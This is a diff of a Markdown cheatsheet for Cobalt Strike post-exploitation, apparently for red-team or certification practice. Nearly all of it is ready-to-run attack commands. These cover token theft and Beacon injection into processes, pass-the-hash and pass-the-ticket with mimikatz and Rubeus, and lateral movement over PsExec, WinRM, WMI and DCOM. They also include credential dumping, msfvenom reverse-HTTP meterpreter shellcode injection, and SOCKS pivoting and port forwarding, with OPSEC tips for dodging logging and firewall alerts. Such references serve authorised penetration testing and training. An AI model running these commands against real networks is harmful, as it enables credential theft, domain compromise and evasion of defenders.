@@ -1,5 +1,9 @@
 # Cobalt-Strike cheatsheet.
 # General
+#### Get current user
+```
+getuid
+```
 
 #### Change sleep / Set interactive
 - OPSEC Lower sleep = More traffic/Noice = More likely to get caught.
@@ -229,7 +233,104 @@ execute-assembly <PATH TO EXE> -group=system
 powershell-import <FILE>
 ```
 
-## Lateral movement
+## Lateral Movement
+### User impersonation
+#### Make token - runas other user
+```
+make_token <DOMAIN>\<USER> <PASSWORD>
+```
+
+#### Rev2self
+- Drops impersonation and will undo the make token
+```
+rev2self
+```
+
+#### Steal token
+- If a user is running a process on the system, we can steal its process
+```
+steal_token <PID>
+````
+
+#### Inject payload into process
+```
+inject <PID> <ARCH> <BEACON>
+```
+
+#### Spawnas
+- Will spawn a new process using the plaintext credentials of another user and inject a Beacon payload into it.
+- Must be run from a folder the user has access to.
+- This command does not require local admin privileges and will also usually fail if run from a SYSTEM Beacon.
+```
+spawnas <DOMAIN>\<USER> <PASSWORD> <BEACON>
+```
+
+#### Pass the hash
+```
+pth <DOMAIN>\<USER> <NTLM HASH>
+```
+
+```
+mimikatz sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM> /run:"powershell -w hidden"
+steal_token <PID>
+```
+
+#### Pass the ticket
+- OPSEC: By default, Rubeus will use a random username, domain and password with CreateProcessWithLogonW, which will appear in the associated 4624 logon event.  The "Suspicious Logon Events" saved search will show 4624's where the TargetOutboundDomainName is not an expected value.
+```
+execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
+execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain<DOMAIN> /username:<USER> /password:FakePass123
+
+execute-assembly Rubeus.exe ptt /luid:<LUID FROM PREVIOUS COMMAND> /ticket:<BASE64 TICKET>
+
+steal_token <PID OF FIRST COMMAND>
+```
+
+#### Overpass the hash
+- OPSEC: Use AES256 keys
+```
+execute-assembly Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /rc4:<NTLM HASH> /nowrap
+execute-assembly Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /aes256:<AES256 HASH> /nowrap /opsec
+
+make_token <DOMAIN>\<USER> DummyPass
+[System.IO.File]::WriteAllBytes("C:\Users\public\ticket.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
+kerberos_ticket_use C:\Users\public\ticket.kirbi
+
+ls \\<HOSTNAME>\c$
+```
+
+#### Overpass the hash elevated context
+```
+execute-assembly Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /aes256:<AES256 HASH> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
+
+#output: [+] ProcessID       : <PID>
+
+steal_token <PID>
+
+ls \\<HOSTNAME>\c$
+```
+
+#### Extract and inject ticket, then steal token
+- Extract tickets of a user, create new process, inject ticket into process, steal token from the process
+```
+execute-assembly Rubeus.exe triage
+execute-assembly Rubeus.exe dump /service:krbtgt /luid:<LUID> /nowrap
+execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
+execute-assembly Rubeus.exe ptt /luid:<LUID> /ticket:[...base64-ticket...]
+steal_token <PID>
+```
+
+#### Load TGT or TGS ticket
+```
+kerberos_ticket_use <FILE TO TICKET>
+```
+
+#### Use ccache file
+```
+kerberos_ccache_use
+```
+
+## Lateral Movement Techniques
 #### Jump
 ```
 jump [method] [target] [listener]
@@ -252,32 +353,32 @@ remote-exec [method] [target] [command]
     wmi                             Remote execute via WMI
 ```
 
-#### Using credentials
-- Each of these strategies are compatible with the various credential and impersonation methods described in the next section, Credentials & User Impersonation. For instance, if you have plaintext 
-- credentials of a domain user who is a local administrator on a target, use ```make_token``` and then ```jump``` to use that user's credentials to move laterally to the target.
+### Custom
+- Use primitives such as `powershell`, `execute-assembly`, etc to implement something custom with for example an agressor script.
 
 ### PowerShell Remoting
-#### Getting the architectur
+#### Getting the architecture
 - for winrm or winrm64 with jump
 ```
 remote-exec winrm <HOSTNAME> (Get-WmiObject Win32_OperatingSystem).OSArchitecture
 ```
 
-#### Jump winrm smb beacon
+#### Jump winrm
 ```
-jump winrm64 <HOSTNAME> smb
+jump winrm64 <HOSTNAME> <LISTENER>
 ```
 
-### PSexec
+### Jump PSexec
 ```
-jump psexec64 <HOSTNAME> smb
+jump psexec64 <HOSTNAME> <LISTENER>
 ```
 
 ### WMI
+- Not a jump command but can be used manually
 ```
 cd \\<HOSTNAME>\ADMIN$
-upload C:\Payloads\beacon-smb.exe
-remote-exec wmi <HOSTNAME> C:\Windows\beacon-smb.exe
+upload <BEACON EXE>
+remote-exec wmi <HOSTNAME> <BEACON EXE>
 link <HOSTNAME>
 ```
 
@@ -292,14 +393,15 @@ remote-exec winrm <HOSTNAME> whoami; hostname
 - As a workaround, your WMI execution needs to come from a different process. This can be achieved with commands such as spawn and spawnas, or even execute-assembly with a tool such as SharpWMI.
 
 ```
-remote-exec wmi srv-2 calc
+remote-exec wmi <HOSTNAME> calc.exe
 execute-assembly SharpWMI.exe action=exec computername=<HOSTNAME> command="C:\Windows\System32\calc.exe"
 ```
 
 #### DCOM
 - https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1
 ```
-powershell Invoke-DCOM -ComputerName <HOSTNAME> -Method MMC20.Application -Command C:\Windows\beacon-smb.exe
+powershell-import Invoke-DCOM.ps1
+powershell Invoke-DCOM -ComputerName <HOSTNAME> -Method MMC20.Application -Command <BEACON EXE>
 ```
 
 ### Credentials
@@ -332,117 +434,49 @@ mimikatz !lsadump::cache
 dcsync <DOMAIN> <DOMAIN\USER>
 ```
 
-#### Make token - runas other user
-```
-make_token <DOMAIN>\<USER> <PASSWORD>
-```
-
-#### rev2self
-- Undo the make token
-```
-rev2self
-```
-
-#### Steal token
-```
-steal_token 3320
-steal_token <PID>
-````
-
-#### Inject payload into process
-```
-inject 3320 x64 tcp-4444-local
-inject <PID> <ARCH> <BEACON>
-```
-
-#### Spawnas
-- Will spawn a new process using the plaintext credentials of another user and inject a Beacon payload into it.
-- Must be run from a folder the user has access to.
-- This command does not require local admin privileges and will also usually fail if run from a SYSTEM Beacon.
-```
-spawnas <DOMAIN>\<USER> <PASSWORD> <BEACON>
-```
-
-#### Dcsync
-```
-dcsync
-```
-
-#### Pass the hash
-```
-pth <DOMAIN>\<USER> <NTLM HASH>
-```
-
-```
-mimikatz sekurlsa::pth /user:Administrator /domain:<DOMAIN> /ntlm:<NTLM> /run:"powershell -w hidden"
-steal_token <PID>
-```
-
-#### Overpass the hash
-- OPSEC: Use AES256 keys
-```
-execute-assembly Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /rc4:<NTLM HASH> /nowrap
-execute-assembly Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /aes256:<AES256 HASH> /nowrap /opsec
-
-#Create new logon session
-make_token <DOMAIN>\<USER> DummyPass
-[System.IO.File]::WriteAllBytes("C:\Users\public\ticket.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
-kerberos_ticket_use C:\Users\public\ticket.kirbi
-
-ls \\<HOSTNAME>\c$
-```
-
-#### Overpass the hash elevated context
-```
-execute-assembly Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /aes256:<AES256 HASH> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
-
-#output: [+] ProcessID       : <PID>
-
-steal_token <PID>
-
-ls \\<HOSTNAME>\c$
-```
-
-#### Extract tickets
-- Extract tickets of a user, create new process, inject ticket into process, steal token from the process
-```
-execute-assembly Rubeus.exe triage
-execute-assembly Rubeus.exe dump /service:krbtgt /luid:<LUID> /nowrap
-execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
-execute-assembly Rubeus.exe ptt /luid:<LUID> /ticket:[...base64-ticket...]
-steal_token <PID>
-```
-
-#### Load ticket
-```
-kerberos_ticket_use <FILE TO TICKET>
-```
-
-#### Use ccache file
-```
-kerberos_ccache_use
-```
-
 ## Session passing
-### Cobalt strike --> Metasploit
+#### Beacon passing
+- From one beacon type to another
+- Spawn an process and inject shellcode for the specified listener into it.
 ```
+spawn <ARCHITECTURE> <LISTENER>
+```
+
+#### Cobalt strike --> Metasploit
+- Only supports `x86`
+```
+sudo msfconsole -q
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_http
 set LHOST eth0
-set LPORT 8080
+set LPORT <PORT>
 exploit -j
 ```
-- Go to Listeners --> Add and set the Payload to Foreign HTTP. Set the Host, the Port to 8080, Set the name to Metasploit and click Save.
+- Go to Listeners --> Add and set the Payload to Foreign HTTP. Set the Host, the Port, Set the name to `msf` and click Save. The command `spawn msf` will pass the session to metasploit.
 ```
-spawn metasploit
+spawn msf
 ```
 
-### Cobalt strike --> Metasploit shellcode inside process
+#### Cobalt strike --> Metasploit shellcode shinject new process
 ```
+sudo msfconsole -q
+use exploit/multi/handler
+set payload windows/x64/meterpreter_reverse_http
 msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=8080 -f raw -o /tmp/msf.bin
+
 execute C:\Windows\System32\notepad.exe
 ps
 shinject <PID> x64 msf.bin
+```
+
+#### Cobalt strike --> Metasploit shellcode shspawn new process
+```
+sudo msfconsole -q
+use exploit/multi/handler
+set payload windows/x64/meterpreter_reverse_http
+msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=8080 -f raw -o /tmp/msf_http_x64.bin
+
+shspawn x64 C:\Payloads\msf_http_x64.bin
 ```
 
 ### Metasploit --> Cobalt strike
@@ -456,14 +490,22 @@ run
 
 ## Pivoting
 ### Socksproxy
-#### Enable Socksproxy
-- OPSEC: This binds 1080 on all interfaces and since there is no authentication available on SOCKS4, this port can technically be used by anyone
+#### Enable Socksproxy no auth
+- OPSEC: This binds the port on all interfaces and since there is no authentication available on SOCKS4, this port can technically be used by anyone
 ```
 socks <PORT>
 ```
 
+#### Enable Socksproxy auth
+- The enableLogging option sends additional logs (such as authentication failures) to the VM console, which you unfortunately can't see easily when the team server running as a service.  Instead, you can use journalctl:
+```
+socks <PORT> socks5 disableNoAuth <USER> <PASS> enableLogging
+```
+
+### Using proxychains
 #### Proxychains
 - For linux
+- Change proxychains config `socks5 <IP> <PORT> <USER> <PASS>`
 ```
 sudo vim /etc/proxychains.conf
 proxychains <COMMAND>
@@ -472,16 +514,21 @@ proxychains <COMMAND>
 #### Proxifier
 - https://www.proxifier.com/
 - For windows
-- Open Proxifier, go to Profile > Proxy Servers and Add a new proxy entry, which will point at the IP address and Port of your Cobalt Strike SOCKS proxy.
-- Next, go to Profile > Proxification Rules. This is where you can add rules that tell Proxifier when and where to proxy specific applications. Multiple applications can be added to the same rule, but in this example, I'm creating a single rule for adexplorer64.exe (part of the Sysinternals Suite).
+- Open Proxifier, go to Profile -> Proxy Servers and Add a new proxy entry, which will point at the IP address and Port of your Cobalt Strike SOCKS proxy.
+- Next, go to Profile -> Proxification Rules. This is where you can add rules that tell Proxifier when and where to proxy specific applications. Multiple applications can be added to the same rule, but in this example, I'm creating a single rule for adexplorer64.exe (part of the Sysinternals Suite).
 - Target hosts fill in the target internal network range with the action ```proxy socks <TARGET>```
-- NOTE: You will also need to add a static host entry in your C:\Windows\System32\drivers\etc\hosts file: <DC IP> <DOMAIN>. You can enable DNS lookups through Proxifier, but that will cause DNS leaks from your computer into the target environment.
+- NOTE: You will also need to add a static host entry in `C:\Windows\System32\drivers\etc\hosts` file: `<DC IP> <DOMAIN>`. You can enable DNS lookups through Proxifier, but that will cause DNS leaks from your computer into the target environment.
 
 #### Proxychains netonly or overpass the hash
 ```
 runas /netonly /user:<DOMAIN>\<USER> "C:\windows\system32\mmc.exe C:\windows\system32\dsa.msc"
 sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:"C:\windows\system32\mmc.exe C:\windows\system32\dsa.msc"
 ```
+
+#### Browser
+- Install FoxyProxy https://getfoxyproxy.org/
+- Configure Proxy IP and port, Username and Password.
+- NTLM auth: https://offensivedefence.co.uk/posts/ntlm-auth-firefox/
 
 #### Metasploit
 - In Cobalt Strike, go to View > Proxy Pivots, highlight the existing SOCKS proxy and click the Tunnel button. 
@@ -505,15 +552,21 @@ netsh interface portproxy show v4tov4
 netsh interface portproxy delete v4tov4 listenaddress=<IP> listenport=<PORT>
 ```
 
-#### Create port forward rportfwd
+### Rportfwd
+#### Create port forward
 - Beacon's reverse port forward always tunnels the traffic to the Team Server and the Team Server sends the traffic to its intended destination, so shouldn't be used to relay traffic between individual machines.
 - Does not require administrator privs
+- OPSEC: When the Windows firewall is enabled, it will prompt the user with an alert when an application attempts to listen on a port that is not explicitly allowed.  Allowing access requires local admin privileges and clicking cancel will create an explicit block rule. Have to create firewall rule first!
 ```
+powershell New-NetFirewallRule -DisplayName "Test Rule" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort <PORT>
+
 rportfwd <PORT> <IP> <PORT>
 ```
 
-#### Stop port forward rportfwd
+#### Stop and remove firewall rule
 ```
+powershell Remove-NetFirewallRule -DisplayName "Test Rule"
+
 rportfwd stop <PORT>
 ```
 
